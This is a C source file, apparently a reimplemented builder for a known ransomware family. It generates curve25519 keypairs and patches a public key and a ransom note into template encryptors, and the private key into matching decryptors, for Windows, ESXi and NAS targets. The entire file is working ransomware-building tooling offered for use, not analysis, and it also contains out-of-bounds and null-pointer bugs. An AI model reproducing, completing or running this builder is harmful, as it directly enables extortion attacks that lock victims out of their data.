#include <windows.h>

#include <stdio.h>
#include <stdlib.h>

#include "libs/curve25519/curve25519-donna.h"


/*
 *
 * I dont feel like reversing their custom printf() and system() functions, it's simply extra.
 * This is really bad lol.
 *
 */

// Prototypes
INT build_encrypt(LPCSTR build_name);
INT build_decrypt(LPCSTR build_name);

// Global variables
const CHAR notepattern[] = "notepattern";
const CHAR curvpattern[] = "curvpattern";

CHAR g_enc_path[264],
	 g_dec_path[264];

CHAR pub_key_path[264],
	 prv_key_path[264];
	 
BYTE pub_key_bytes[32],
	 prv_key_bytes[32];

// For curve25519
const BYTE BASED_POINT[32] = { 9 };

int main(int argc, char** argv)
{	
	HCRYPTPROV hProv;
	
	if(argc != 2 && argc != 3)
	{
		printf("Usage: builder.exe FolderName\n");
		return 0;
	}
	
	// Setup file paths
	printf("Creating folder '%s'\n", argv[1]);
	
	CreateDirectoryA(argv[1], 0);
	lstrcpyA(pub_key_path, argv[1]);
	lstrcpyA(prv_key_path, argv[1]);
	lstrcatA(pub_key_path, "\\kp.curve25519");
	lstrcatA(prv_key_path, "\\ks.curve25519");
	
	if(argc == 2)
	{
		if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)
		&& !CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
		{
			hProv = 0L;
		}
		
		if(!hProv)
		{
			printf("Can't initialize HCRYPTPROV, bye!\n");
			ExitProcess(0);
		}
		
		// Generate curve25519 keypair
		CryptGenRandom(hProv, 32, prv_key_bytes);
		
		prv_key_bytes[0]  &= 248;
		prv_key_bytes[31] &= 127;
		prv_key_bytes[32] |= 64;
		
		curve25519_donna(pub_key_bytes, prv_key_bytes, BASED_POINT);
		printf("curve25519 keys generated.\n");
		
BUILD_SHIT:
		// Build windows encryptor & decryptor
		lstrcpyA(g_enc_path, argv[1]);
		lstrcatA(g_enc_path, "\\e_win.exe");
		build_encrypt("e_win.bin");

		lstrcpyA(g_dec_path, argv[1]);
		lstrcatA(g_dec_path, "\\d_win.exe");
		build_decrypt("d_win.bin");
		
		// Build ESXI encryptor & decryptor
		lstrcpyA(g_enc_path, argv[1]);
		lstrcatA(g_enc_path, "\\e_esxi.out");
		build_encrypt("e_esxi.out");
		
		lstrcpyA(g_dec_path, argv[1]);
		lstrcatA(g_dec_path, "\\d_esxi.out");
		build_decrypt("d_esxi.out");
		
		// Build NAS encryptor & decryptor
		lstrcpyA(g_enc_path, argv[1]);
		lstrcatA(g_enc_path, "\\e_nas_x86.out");
		build_encrypt("e_nas_x86.out");
		
		lstrcpyA(g_dec_path, argv[1]);
		lstrcatA(g_dec_path, "\\d_nas_x86.out");
		build_decrypt("d_nas_x86.out");
		
		lstrcpyA(g_enc_path, argv[1]);
		lstrcatA(g_enc_path, "\\e_nas_arm.out");
		build_encrypt("e_nas_arm.out");
		
		lstrcpyA(g_dec_path, argv[1]);
		lstrcatA(g_dec_path, "\\d_nas_arm.out");
		build_decrypt("d_nas_arm.out");
		
		
		//
		hProv = 0;
		HANDLE hPubpath = CreateFileA(pub_key_path, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hPubpath == INVALID_HANDLE_VALUE)
		{
			printf("Can't open %s, bye!\n", pub_key_path);
		}
		else
		{
			WriteFile(hPubpath, pub_key_bytes, 32, &hProv, NULL);
			CloseHandle(hPubpath);
			
			HANDLE hPrvpath = CreateFileA(prv_key_path, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if(hPrvpath != INVALID_HANDLE_VALUE)
			{
				WriteFile(hPrvpath, prv_key_bytes, 32, &hProv, NULL);
				CloseHandle(hPrvpath);
				
				printf("\"%s\" written!\n", pub_key_path);
				printf("\"%s\" written!\n", prv_key_path);
				system("pause");
				
				// SUCCESS!
				return 0;
			}
			printf("Can't open %s, bye!\n", prv_key_path);
		}
		ExitProcess(0);
	}
	
	HANDLE hPreKey = CreateFileA(prv_key_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hPreKey != INVALID_HANDLE_VALUE)
	{
		ReadFile(hPreKey, prv_key_bytes, 32, &hProv, NULL);
		curve25519_donna(pub_key_bytes, prv_key_bytes, BASED_POINT);
		CloseHandle(hPreKey);
		goto BUILD_SHIT;
	}
	
	printf("Can't open keyfile '%s'\n", argv[2]);
	return 0;
}


INT build_encrypt(LPCSTR build_name)
{
	DWORD readbytes = 0;
	CHAR note_buff[8192] = {0};
	
	HANDLE hNote = CreateFileA("note.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hNote == INVALID_HANDLE_VALUE)
	{
		printf("Can't open note.txt, bye!\n");
		ExitProcess(0);
	}
	
	if(GetFileSize(hNote, NULL) > 8192)
	{
		printf("note.txt can't be bigger than 8192 bytes, bye!\n");
		ExitProcess(0);
	}
	
	ReadFile(hNote, note_buff, 8192, &readbytes, NULL);
	
	HANDLE hDoner = CreateFileA(build_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hBuild = CreateFileA(g_enc_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hDoner == INVALID_HANDLE_VALUE)
	{
		printf("Can't open handle for e.bin, bye!\n");
		ExitProcess(0);
	}
	if(hBuild == INVALID_HANDLE_VALUE)
	{
		printf("Can't open handle for %s, bye!\n", g_enc_path);
		ExitProcess(0);
	}
	
	DWORD doner_size = GetFileSize(hDoner, NULL);
	DWORD wrotebytes = doner_size;
	CHAR *doner_copy = (CHAR*)malloc(doner_size);
	ReadFile(hDoner, doner_copy, doner_size, &readbytes, NULL);
	
	// They are smoking crack
	int j;
	CHAR *k;
	
	for(int i = 0; i < doner_size; i++)
	{
		j = 0;
		while(TRUE)
		{
			k = &doner_copy[i];
			if(doner_copy[i + j] != notepattern[j])
			{
				break;
			}
			
			if(++j >= 11)
			{
				goto FINISH_1;
			}
		}
	}
	
	j = 0;
	CHAR *n;
	
	if(doner_size != 0)
	{
FINISH_1:
		DWORD l = 0;
		while(l < wrotebytes)
		{
			int m = 0;
			while(TRUE)
			{
				n = &doner_copy[l];
				if(doner_copy[l + m] != curvpattern[m])
				{
					break;
				}
				
				if(++m >= 11)
				{
					goto FINISH_2;
				}
			}
			l++;
		}
	}
	
	n = 0x00;
	
FINISH_2:
	//k[readbytes] = 0x00; // crash here
	memmove(k, note_buff, 8192);
	memcpy(n, pub_key_bytes, 32);
	
	WriteFile(hBuild, doner_copy, wrotebytes, &readbytes, NULL);
	
	CloseHandle(hDoner);
	CloseHandle(hBuild);
	CloseHandle(hNote);
	return printf("\"%s\" written!\n", g_enc_path);
}


INT build_decrypt(LPCSTR build_name)
{
	DWORD readbytes;
	
	HANDLE hDoner = CreateFileA(build_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hBuild = CreateFileA(g_dec_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hDoner == INVALID_HANDLE_VALUE)
	{
		printf("Can't open handle for e.bin, bye!\n");
		ExitProcess(0);
	}
	if(hBuild == INVALID_HANDLE_VALUE)
	{
		printf("Can't open handle for %s, bye!\n", g_enc_path);
		ExitProcess(0);
	}
	
	DWORD doner_size = GetFileSize(hDoner, NULL);
	CHAR *doner_copy = (CHAR*)malloc(doner_size);
	ReadFile(hDoner, doner_copy, doner_size, &readbytes, NULL);
	
	CHAR *j;
	for(int i = 0; i < doner_size; ++i)
	{
		int k = 0;
		while(TRUE)
		{
			j = &doner_copy[i];
			if(doner_copy[i + k] != curvpattern[k])
			{
				break;
			}
			if(++k >= 11)
			{
				goto FINISH;
			}
		}
	}
	
	j = 0;
	
FINISH:
	memcpy(j, prv_key_bytes, 32);
	WriteFile(hBuild, doner_copy, doner_size, &readbytes, NULL);
	
	CloseHandle(hDoner);
	CloseHandle(hBuild);
	return printf("\"%s\" written!\n", g_dec_path);
}